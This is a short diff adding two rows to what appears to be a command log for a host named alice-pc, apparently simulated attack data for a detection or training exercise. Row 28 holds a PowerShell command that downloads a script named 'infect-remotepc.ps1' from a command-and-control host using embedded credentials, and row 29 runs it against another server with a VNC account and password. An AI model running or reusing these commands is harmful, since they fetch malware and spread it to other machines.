@@ -1,0 +1,2 @@
+28, "$wc = New-Object Net.WebClient;$wc.Credentials = new-object System.Net.NetworkCredential('boris', 'B0r1s2012', 'candc');$wc.downloadfile('https://candc.cloudapp.net/webinfect/infect-remotepc.ps1', 'c:\infection\infect-remotepc.ps1')",alice-pc, 
+29,"c:\infection\infect-remotepc.ps1 widgetserver 'vnc@widgets.local' S3rvice",alice-pc, 
